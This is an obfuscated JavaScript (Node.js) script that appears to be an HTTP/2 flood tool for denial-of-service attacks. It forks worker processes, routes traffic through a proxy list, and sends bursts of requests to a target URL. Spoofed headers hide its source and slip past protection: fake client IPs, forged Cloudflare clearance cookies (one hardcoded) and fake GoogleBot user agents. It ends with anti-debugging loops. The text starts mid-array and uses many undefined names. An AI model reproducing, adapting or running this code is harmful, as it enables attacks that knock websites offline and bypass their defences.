    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36',
  ]
version = [
  '"Chromium";v="100", "Google Chrome";v="100"',
  '"(Not(A:Brand";v="8", "Chromium";v="98"',
  '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
  '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
  '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
  '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
  '"Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"',
]
platform = ['Windows']
site = ['cross-site', 'same-origin', 'same-site', 'none']
mode = ['cors', 'navigate', 'no-cors', 'same-origin']
dest = ['document', 'image', 'embed', 'empty', 'frame']
const KONTOLLLLL_0x57af0e = [
    { 'akamai-origin-hop': KONTOLLLLL_0x84afee(5) },
    { 'source-ip': KONTOLLLLL_0x84afee(5) },
    { via: KONTOLLLLL_0x84afee(5) },
    { 'cluster-ip': KONTOLLLLL_0x84afee(5) },
  ],
  KONTOLLLLL_0x45ac78 = [
    { 'akamai-origin-hop': KONTOLLLLL_0x84afee(5) },
    { 'source-ip': KONTOLLLLL_0x84afee(5) },
    { via: KONTOLLLLL_0x84afee(5) },
    { 'cluster-ip': KONTOLLLLL_0x84afee(5) },
  ],
  KONTOLLLLL_0xc6113 = [
    '(CheckSecurity 2_0)',
    '(BraveBrowser 5_0)',
    '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)',
    '(AtakeBrowser 2_0)',
    '(NasaChecker)',
    '(CloudFlareIUAM)',
    '(NginxChecker)',
    '(AAPanel)',
    '(AntiLua)',
    '(FushLua)',
    '(FBIScan)',
    '(FirefoxTop)',
    '(ChinaNet Bot)',
  ],
  KONTOLLLLL_0x4a1ac2 = [
    'Mozilla/5.0 ',
    'Mozilla/6.0 ',
    'Mozilla/7.0 ',
    'Mozilla/8.0 ',
    'Mozilla/9.0 ',
  ]
var KONTOLLLLL_0x27d689 =
    KONTOLLLLL_0xc792b2[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0xc792b2.length))
    ],
  KONTOLLLLL_0x24c28d =
    KONTOLLLLL_0x315dc2[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0x315dc2.length))
    ],
  KONTOLLLLL_0x100136 =
    KONTOLLLLL_0x5a803c[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0x5a803c.length))
    ],
  KONTOLLLLL_0x3cfd85 =
    version[Math.floor(Math.floor(Math.random() * version.length))],
  KONTOLLLLL_0x1d870a =
    KONTOLLLLL_0xc6113[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0xc6113.length))
    ],
  KONTOLLLLL_0x46e4a5 =
    platform[Math.floor(Math.floor(Math.random() * platform.length))],
  KONTOLLLLL_0xb7a7e8 =
    KONTOLLLLL_0xced031[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0xced031.length))
    ],
  KONTOLLLLL_0x4bacda =
    site[Math.floor(Math.floor(Math.random() * site.length))],
  KONTOLLLLL_0x744c48 =
    KONTOLLLLL_0x4a1ac2[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0x4a1ac2.length))
    ],
  KONTOLLLLL_0x41bddf =
    mode[Math.floor(Math.floor(Math.random() * mode.length))],
  KONTOLLLLL_0x4c1bcb =
    dest[Math.floor(Math.floor(Math.random() * dest.length))],
  KONTOLLLLL_0x31d187 =
    KONTOLLLLL_0x47031e[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0x47031e.length))
    ],
  KONTOLLLLL_0x33c4c2 =
    lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))],
  KONTOLLLLL_0x2255c0 =
    KONTOLLLLL_0x104a8f[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0x104a8f.length))
    ],
  KONTOLLLLL_0x51fcec =
    KONTOLLLLL_0x4beb5a[
      Math.floor(Math.floor(Math.random() * KONTOLLLLL_0x4beb5a.length))
    ],
  KONTOLLLLL_0x4269fe = KONTOLLLLL_0x39047a(KONTOLLLLL_0x31ae25.proxyFile)
const KONTOLLLLL_0x3b8cd3 = KONTOLLLLL_0x5a87fc.parse(
  KONTOLLLLL_0x31ae25.target
)
if (KONTOLLLLL_0x4b0407.isMaster) {
  for (
    let KONTOLLLLL_0x14c4c2 = 1;
    KONTOLLLLL_0x14c4c2 <= KONTOLLLLL_0x31ae25.threads;
    KONTOLLLLL_0x14c4c2++
  ) {
    KONTOLLLLL_0x4b0407.fork()
  }
} else {
  setInterval(KONTOLLLLL_0x4e8a3f)
}
class KONTOLLLLL_0x5ad1e9 {
  constructor() {}
  ['HTTP'](_0x3f2a10, _0x504f13) {
    const _0x52428c = _0x3f2a10.address.split(':'),
      _0x1b1e7e = _0x52428c[0]
    const _0x23a7cd =
        'CONNECT ' +
        _0x3f2a10.address +
        ':443 HTTP/1.1\r\nHost: ' +
        _0x3f2a10.address +
        ':443\r\nConnection: Keep-Alive\r\n\r\n',
      _0x28ec95 = new Buffer.from(_0x23a7cd),
      _0x5adc42 = {
        host: _0x3f2a10.host,
        port: _0x3f2a10.port,
      }
    const _0x59e6b0 = KONTOLLLLL_0x44b201.connect(_0x5adc42)
    _0x59e6b0.setTimeout(_0x3f2a10.timeout * 100000)
    _0x59e6b0.setKeepAlive(true, 100000)
    _0x59e6b0.on('connect', () => {
      _0x59e6b0.write(_0x28ec95)
    })
    _0x59e6b0.on('data', (_0x978f70) => {
      const _0x3b8085 = _0x978f70.toString('utf-8'),
        _0x4ed61f = _0x3b8085.includes('HTTP/1.1 200')
      if (_0x4ed61f === false) {
        return (
          _0x59e6b0.destroy(),
          _0x504f13(undefined, 'error: invalid response from proxy server')
        )
      }
      return _0x504f13(_0x59e6b0, undefined)
    })
    _0x59e6b0.on('timeout', () => {
      return (
        _0x59e6b0.destroy(), _0x504f13(undefined, 'error: timeout exceeded')
      )
    })
    _0x59e6b0.on('error', (_0x14bc89) => {
      return _0x59e6b0.destroy(), _0x504f13(undefined, 'error: ' + _0x14bc89)
    })
  }
}
const KONTOLLLLL_0x29ad6d = new KONTOLLLLL_0x5ad1e9()
KONTOLLLLL_0x2a5fb1[':method'] = 'GET'
KONTOLLLLL_0x2a5fb1[':method'] = 'POST'
KONTOLLLLL_0x2a5fb1[':authority'] = KONTOLLLLL_0x3b8cd3.host
KONTOLLLLL_0x2a5fb1['x-forwarded-proto'] = 'https'
KONTOLLLLL_0x2a5fb1[':path'] =
  KONTOLLLLL_0x3b8cd3.path +
  '?' +
  KONTOLLLLL_0x84afee(6) +
  '=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1[':scheme'] = 'https'
KONTOLLLLL_0x2a5fb1[':path'] =
  KONTOLLLLL_0x3b8cd3.path +
  pathts[Math.floor(Math.random() * pathts.length)] +
  '&' +
  randomString(10) +
  queryString +
  randomString(10)
KONTOLLLLL_0x2a5fb1[':path'] =
  KONTOLLLLL_0x3b8cd3.path +
  '?' +
  KONTOLLLLL_0x84afee(5) +
  '=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1[':path'] =
  KONTOLLLLL_0x3b8cd3.path +
  '?' +
  KONTOLLLLL_0x84afee(6) +
  '=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1[':authority'] = KONTOLLLLL_0x3b8cd3.host
KONTOLLLLL_0x2a5fb1.origin = KONTOLLLLL_0x3b8cd3.host
KONTOLLLLL_0x2a5fb1['Content-Type'] = randomHeaders['Content-Type']
KONTOLLLLL_0x2a5fb1[':scheme'] = 'https'
KONTOLLLLL_0x2a5fb1['x-download-options'] = randomHeaders['x-download-options']
KONTOLLLLL_0x2a5fb1['Cross-Origin-Embedder-Policy'] =
  randomHeaders['Cross-Origin-Embedder-Policy']
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1['Cross-Origin-Opener-Policy'] =
  randomHeaders['Cross-Origin-Opener-Policy']
KONTOLLLLL_0x2a5fb1.accept = randomHeaders.accept
KONTOLLLLL_0x2a5fb1.accept = randomHeaders.accept
KONTOLLLLL_0x2a5fb1.accept = KONTOLLLLL_0x31d187
KONTOLLLLL_0x2a5fb1['accept-language'] = randomHeaders['accept-language']
KONTOLLLLL_0x2a5fb1['accept-language'] = KONTOLLLLL_0x33c4c2
KONTOLLLLL_0x2a5fb1['Referrer-Policy'] = randomHeaders['Referrer-Policy']
KONTOLLLLL_0x2a5fb1.referer = KONTOLLLLL_0xb7a7e8
KONTOLLLLL_0x2a5fb1['x-cache'] = randomHeaders['x-cache']
KONTOLLLLL_0x2a5fb1['Content-Security-Policy'] =
  randomHeaders['Content-Security-Policy']
KONTOLLLLL_0x2a5fb1['accept-encoding'] = randomHeaders['accept-encoding']
KONTOLLLLL_0x2a5fb1['accept-encoding'] = KONTOLLLLL_0x2255c0
KONTOLLLLL_0x2a5fb1['cache-control'] = randomHeaders['cache-control']
KONTOLLLLL_0x2a5fb1['x-frame-options'] = randomHeaders['x-frame-options']
KONTOLLLLL_0x2a5fb1['x-xss-protection'] = randomHeaders['x-xss-protection']
KONTOLLLLL_0x2a5fb1['x-content-type-options'] = 'nosniff'
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1.TE = 'trailers'
KONTOLLLLL_0x2a5fb1.pragma = randomHeaders.pragma
KONTOLLLLL_0x2a5fb1['sec-ch-ua-platform'] = randomHeaders['sec-ch-ua-platform']
KONTOLLLLL_0x2a5fb1['upgrade-insecure-requests'] = '1'
KONTOLLLLL_0x2a5fb1['sec-fetch-dest'] = randomHeaders['sec-fetch-dest']
KONTOLLLLL_0x2a5fb1['sec-fetch-mode'] = randomHeaders['sec-fetch-mode']
KONTOLLLLL_0x2a5fb1['sec-fetch-site'] = randomHeaders['sec-fetch-site']
KONTOLLLLL_0x2a5fb1['X-Forwarded-Proto'] = HTTPS
KONTOLLLLL_0x2a5fb1['sec-ch-ua'] = randomHeaders['sec-ch-ua']
KONTOLLLLL_0x2a5fb1['sec-ch-ua-mobile'] = randomHeaders['sec-ch-ua-mobile']
KONTOLLLLL_0x2a5fb1['sec-ch-ua-platform'] = randomHeaders['sec-ch-ua-platform']
KONTOLLLLL_0x2a5fb1['sec-ch-ua-mobile'] = '?0'
KONTOLLLLL_0x2a5fb1['sec-ch-ua-platform'] = pl
KONTOLLLLL_0x2a5fb1['accept-language'] = KONTOLLLLL_0x33c4c2
KONTOLLLLL_0x2a5fb1['accept-encoding'] = KONTOLLLLL_0x2255c0
KONTOLLLLL_0x2a5fb1['upgrade-insecure-requests'] = '1'
KONTOLLLLL_0x2a5fb1.vary = randomHeaders.vary
KONTOLLLLL_0x2a5fb1['x-requested-with'] = 'XMLHttpRequest'
KONTOLLLLL_0x2a5fb1.TE = trailers
KONTOLLLLL_0x2a5fb1['set-cookie'] = randomHeaders['set-cookie']
KONTOLLLLL_0x2a5fb1.cookie =
  'cf_clearance=' +
  KONTOLLLLL_0x84afee(4) +
  '.' +
  KONTOLLLLL_0x84afee(20) +
  '.' +
  KONTOLLLLL_0x84afee(40) +
  '-0.0.1 ' +
  KONTOLLLLL_0x84afee(20) +
  ';_ga=' +
  KONTOLLLLL_0x84afee(20) +
  ';_gid=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1.Server = randomHeaders.Server
KONTOLLLLL_0x2a5fb1['strict-transport-security'] =
  randomHeaders['strict-transport-security']
KONTOLLLLL_0x2a5fb1['access-control-allow-headers'] =
  randomHeaders['access-control-allow-headers']
KONTOLLLLL_0x2a5fb1['access-control-allow-origin'] =
  randomHeaders['access-control-allow-origin']
KONTOLLLLL_0x2a5fb1['Content-Encoding'] = randomHeaders['Content-Encoding']
KONTOLLLLL_0x2a5fb1['alt-svc'] = randomHeaders['alt-svc']
KONTOLLLLL_0x2a5fb1.Via = fakeIP
KONTOLLLLL_0x2a5fb1.sss = fakeIP
KONTOLLLLL_0x2a5fb1['Sec-Websocket-Key'] = fakeIP
KONTOLLLLL_0x2a5fb1['Sec-Websocket-Version'] = 13
KONTOLLLLL_0x2a5fb1.Upgrade = websocket
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = fakeIP
KONTOLLLLL_0x2a5fb1['X-Forwarded-Host'] = fakeIP
KONTOLLLLL_0x2a5fb1['Client-IP'] = fakeIP
KONTOLLLLL_0x2a5fb1['Real-IP'] = fakeIP
KONTOLLLLL_0x2a5fb1.Referer = randomReferer
KONTOLLLLL_0x2a5fb1['User-Agent'] = randomHeaders['User-Agent']
KONTOLLLLL_0x2a5fb1['user-agent'] = KONTOLLLLL_0x5a803c
KONTOLLLLL_0x2a5fb1['User-Agent'] = KONTOLLLLL_0x5a803c
KONTOLLLLL_0x2a5fb1['CF-Connecting-IP'] = fakeIP
KONTOLLLLL_0x2a5fb1['CF-RAY'] = 'randomRayValue'
KONTOLLLLL_0x2a5fb1['CF-Visitor'] = "{'scheme':'https'}"
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1[':authority'] = KONTOLLLLL_0x3b8cd3.host
KONTOLLLLL_0x2a5fb1[':path'] =
  KONTOLLLLL_0x3b8cd3.path +
  '?' +
  KONTOLLLLL_0x84afee(5) +
  '=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1[':scheme'] = 'https'
KONTOLLLLL_0x2a5fb1['x-forwarded-proto'] = 'https'
KONTOLLLLL_0x2a5fb1['cache-control'] = 'no-cache'
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1['sec-ch-ua'] =
  '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"'
KONTOLLLLL_0x2a5fb1['sec-ch-ua-mobile'] = '?0'
KONTOLLLLL_0x2a5fb1['sec-ch-ua-platform'] = 'Windows'
KONTOLLLLL_0x2a5fb1['accept-language'] = KONTOLLLLL_0x33c4c2
KONTOLLLLL_0x2a5fb1['accept-encoding'] = KONTOLLLLL_0x2255c0
KONTOLLLLL_0x2a5fb1['upgrade-insecure-requests'] = '1'
;(function () {
  let _0x10c2a7
  try {
    const _0x299bdb = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x10c2a7 = _0x299bdb()
  } catch (_0x58deb0) {
    _0x10c2a7 = window
  }
  _0x10c2a7.setInterval(KONTOLLLLL_0x36ff6b, 4000)
})()
KONTOLLLLL_0x2a5fb1.accept = KONTOLLLLL_0x31d187
KONTOLLLLL_0x2a5fb1['user-agent'] =
  KONTOLLLLL_0x744c48 +
  KONTOLLLLL_0x1d870a +
  '-(GoogleBot + http://www.google.com)' +
  ' Code:' +
  KONTOLLLLL_0x84afee(7)
KONTOLLLLL_0x2a5fb1.referer = KONTOLLLLL_0xb7a7e8
KONTOLLLLL_0x2a5fb1['sec-fetch-mode'] = 'navigate'
KONTOLLLLL_0x2a5fb1['sec-fetch-dest'] = KONTOLLLLL_0x4c1bcb
KONTOLLLLL_0x2a5fb1['sec-fetch-user'] = '?1'
KONTOLLLLL_0x2a5fb1.TE = 'trailers'
KONTOLLLLL_0x2a5fb1.cookie =
  'cf_clearance=' +
  KONTOLLLLL_0x84afee(4) +
  '.' +
  KONTOLLLLL_0x84afee(20) +
  '.' +
  KONTOLLLLL_0x84afee(40) +
  '-0.0.1 ' +
  KONTOLLLLL_0x84afee(20) +
  ';_ga=' +
  KONTOLLLLL_0x84afee(20) +
  ';_gid=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1['sec-fetch-site'] = KONTOLLLLL_0x4bacda
KONTOLLLLL_0x2a5fb1['x-requested-with'] = 'XMLHttpRequest'
KONTOLLLLL_0x2a5fb1.GET = ' / HTTP/2'
KONTOLLLLL_0x2a5fb1[':path'] = KONTOLLLLL_0x3b8cd3.path
KONTOLLLLL_0x2a5fb1[':scheme'] = 'https'
KONTOLLLLL_0x2a5fb1.Referer = 'https://google.com'
KONTOLLLLL_0x2a5fb1.accept_header = xn
KONTOLLLLL_0x2a5fb1['accept-language'] = badag
KONTOLLLLL_0x2a5fb1['accept-encoding'] = enc
KONTOLLLLL_0x2a5fb1.Connection = 'keep-alive'
KONTOLLLLL_0x2a5fb1['upgrade-insecure-requests'] = '1'
KONTOLLLLL_0x2a5fb1.TE = 'trailers'
KONTOLLLLL_0x2a5fb1['x-requested-with'] = 'XMLHttpRequest'
KONTOLLLLL_0x2a5fb1['Max-Forwards'] = '10'
KONTOLLLLL_0x2a5fb1.pragma = 'no-cache'
KONTOLLLLL_0x2a5fb1.Cookie =
  'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'
KONTOLLLLL_0x2a5fb1['Real-IP'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1.referer = KONTOLLLLL_0xb7a7e8
KONTOLLLLL_0x2a5fb1[':authority'] = KONTOLLLLL_0x3b8cd3.host + ':80'
KONTOLLLLL_0x2a5fb1.origin = 'https://' + KONTOLLLLL_0x3b8cd3.host + ':80'
KONTOLLLLL_0x2a5fb1.Via = '1.1 ' + KONTOLLLLL_0x3b8cd3.host + ':80'
KONTOLLLLL_0x2a5fb1[':authority'] = KONTOLLLLL_0x3b8cd3.host + ':443'
KONTOLLLLL_0x2a5fb1.origin = 'https://' + KONTOLLLLL_0x3b8cd3.host + ':443'
KONTOLLLLL_0x2a5fb1.Via = '1.1 ' + KONTOLLLLL_0x3b8cd3.host + ':443'
const KONTOLLLLL_0x31bb63 = {}
KONTOLLLLL_0x31bb63['Alt-Svc'] =
  'http/1.1=' + KONTOLLLLL_0x3b8cd3.host + '; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x31bb63)
const KONTOLLLLL_0x4fa867 = {}
KONTOLLLLL_0x4fa867['Alt-Svc'] =
  'http/1.2=' + KONTOLLLLL_0x3b8cd3.host + '; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x4fa867)
const KONTOLLLLL_0x566e51 = {}
KONTOLLLLL_0x566e51['Alt-Svc'] =
  'http/2=' + KONTOLLLLL_0x3b8cd3.host + '; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x566e51)
const KONTOLLLLL_0x29b0ab = {}
KONTOLLLLL_0x29b0ab['Alt-Svc'] =
  'http/1.1=http2.' + KONTOLLLLL_0x3b8cd3.host + ':80; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x29b0ab)
const KONTOLLLLL_0xe5d671 = {}
KONTOLLLLL_0xe5d671['Alt-Svc'] =
  'http/1.2=http2.' + KONTOLLLLL_0x3b8cd3.host + ':80; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0xe5d671)
const KONTOLLLLL_0x573d35 = {}
KONTOLLLLL_0x573d35['Alt-Svc'] =
  'http/2=http2.' + KONTOLLLLL_0x3b8cd3.host + ':80; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x573d35)
const KONTOLLLLL_0x2e3e55 = {}
KONTOLLLLL_0x2e3e55['Alt-Svc'] =
  'http/1.1=' + KONTOLLLLL_0x3b8cd3.host + ':443; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x2e3e55)
const KONTOLLLLL_0x525d15 = {}
KONTOLLLLL_0x525d15['Alt-Svc'] =
  'http/1.2=' + KONTOLLLLL_0x3b8cd3.host + ':443; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x525d15)
const KONTOLLLLL_0x4cb5b4 = {}
KONTOLLLLL_0x4cb5b4['Alt-Svc'] =
  'http/2=' + KONTOLLLLL_0x3b8cd3.host + ':443; ma=7200'
KONTOLLLLL_0x2a5fb1.push(KONTOLLLLL_0x4cb5b4)
KONTOLLLLL_0x2a5fb1[':authority'] = KONTOLLLLL_0x3b8cd3.host
KONTOLLLLL_0x2a5fb1[':path'] =
  KONTOLLLLL_0x3b8cd3.path +
  '?' +
  KONTOLLLLL_0x84afee(5) +
  '=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1[':scheme'] = 'https'
KONTOLLLLL_0x2a5fb1['x-forwarded-proto'] = 'https'
KONTOLLLLL_0x2a5fb1['cache-control'] = 'no-cache'
KONTOLLLLL_0x2a5fb1['X-Forwarded-For'] = KONTOLLLLL_0x2cde7d
KONTOLLLLL_0x2a5fb1['sec-ch-ua'] =
  '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"'
KONTOLLLLL_0x2a5fb1['sec-ch-ua-mobile'] = '?0'
KONTOLLLLL_0x2a5fb1['sec-ch-ua-platform'] = 'Windows'
KONTOLLLLL_0x2a5fb1['accept-language'] = KONTOLLLLL_0x33c4c2
KONTOLLLLL_0x2a5fb1['accept-encoding'] = KONTOLLLLL_0x2255c0
KONTOLLLLL_0x2a5fb1['upgrade-insecure-requests'] = '1'
KONTOLLLLL_0x2a5fb1.accept = KONTOLLLLL_0x31d187
KONTOLLLLL_0x2a5fb1['user-agent'] =
  KONTOLLLLL_0x744c48 +
  KONTOLLLLL_0x1d870a +
  '-(GoogleBot + http://www.google.com)' +
  ' Code:' +
  KONTOLLLLL_0x84afee(7)
KONTOLLLLL_0x2a5fb1.referer = KONTOLLLLL_0xb7a7e8
KONTOLLLLL_0x2a5fb1['sec-fetch-mode'] = 'navigate'
KONTOLLLLL_0x2a5fb1['sec-fetch-dest'] = KONTOLLLLL_0x4c1bcb
KONTOLLLLL_0x2a5fb1['sec-fetch-user'] = '?1'
KONTOLLLLL_0x2a5fb1.TE = 'trailers'
KONTOLLLLL_0x2a5fb1.cookie =
  'cf_clearance=' +
  KONTOLLLLL_0x84afee(4) +
  '.' +
  KONTOLLLLL_0x84afee(20) +
  '.' +
  KONTOLLLLL_0x84afee(40) +
  '-0.0.1 ' +
  KONTOLLLLL_0x84afee(20) +
  ';_ga=' +
  KONTOLLLLL_0x84afee(20) +
  ';_gid=' +
  KONTOLLLLL_0x84afee(15)
KONTOLLLLL_0x2a5fb1['sec-fetch-site'] = KONTOLLLLL_0x4bacda
KONTOLLLLL_0x2a5fb1['x-requested-with'] = 'XMLHttpRequest'
function KONTOLLLLL_0x4e8a3f() {
  const _0x42855b = KONTOLLLLL_0x4712e5(KONTOLLLLL_0x4269fe)
  const _0x3b3215 = _0x42855b.split(':')
  KONTOLLLLL_0x2a5fb1.origin = 'https://' + KONTOLLLLL_0x3b8cd3.host
  const _0x357ce6 = {
    host: _0x3b3215[0],
    port: ~~_0x3b3215[1],
    address: KONTOLLLLL_0x3b8cd3.host + ':443',
    timeout: 300,
  }
  KONTOLLLLL_0x29ad6d.HTTP(_0x357ce6, (_0x201d02, _0x1a460f) => {
    if (_0x1a460f) {
      return
    }
    _0x201d02.setKeepAlive(true, 200000)
    const _0x365c5a = {
      secure: true,
      ALPNProtocols: ['h2'],
      sigals: KONTOLLLLL_0x24c28d,
      socket: _0x201d02,
      ciphers: KONTOLLLLL_0x27d689,
      ecdhCurve: 'prime256v1:X25519',
      host: KONTOLLLLL_0x3b8cd3.host,
      rejectUnauthorized: false,
      servername: KONTOLLLLL_0x3b8cd3.host,
      secureProtocol: [
        'TLSv1_1_method',
        'TLS_method',
        'TLSv1_2_method',
        'TLSv1_3_method',
      ],
    }
    const _0x212a95 = _0x365c5a,
      _0x4e24e4 = KONTOLLLLL_0x4a55a0.connect(
        443,
        KONTOLLLLL_0x3b8cd3.host,
        _0x212a95
      )
    _0x4e24e4.setKeepAlive(true, 60000)
    const _0x5bf700 = {
      protocol: 'https:',
      settings: _0x1f0454,
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x4e24e4,
      socket: _0x201d02,
    }
    const _0x45fb2d = KONTOLLLLL_0x6f5cbf.connect(
      KONTOLLLLL_0x3b8cd3.href,
      _0x5bf700
    )
    _0x45fb2d.settings(_0x23992c)
    setInterval(() => {
      _0x45fb2d.on('connect', () => {
        const _0x4fd687 = {
          ...KONTOLLLLL_0x2a5fb1,
          ...KONTOLLLLL_0x45ac78[
            Math.floor(Math.random() * KONTOLLLLL_0x57af0e.length)
          ],
          ...KONTOLLLLL_0x57af0e[
            Math.floor(Math.random() * KONTOLLLLL_0x57af0e.length)
          ],
        }
        for (
          let _0x48e5e = 0;
          _0x48e5e < KONTOLLLLL_0x31ae25.Rate;
          _0x48e5e++
        ) {
          const _0x2e09de = _0x45fb2d.request(_0x4fd687)
          _0x2e09de.on('response', (_0x20f690) => {
            _0x2e09de.close()
            _0x2e09de.destroy()
            return
          })
          _0x2e09de.end()
        }
      })
    })
    _0x45fb2d.on('close', () => {
      _0x45fb2d.destroy()
      _0x201d02.destroy()
      return
    })
  })
  ;(function (_0x34d5a2, _0x225559, _0x5c2977) {})
}
const KONTOLLLLL_0x32005e = () => process.exit(1)
setTimeout(KONTOLLLLL_0x32005e, KONTOLLLLL_0x31ae25.time * 1000)
function KONTOLLLLL_0x36ff6b(_0x3c7723) {
  function _0x54c15a(_0x200b39) {
    if (typeof _0x200b39 === 'string') {
      return function (_0x431578) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x200b39 / _0x200b39).length !== 1 || _0x200b39 % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x54c15a(++_0x200b39)
  }
  try {
    if (_0x3c7723) {
      return _0x54c15a
    } else {
      _0x54c15a(0)
    }
  } catch (_0x35e514) {}
}
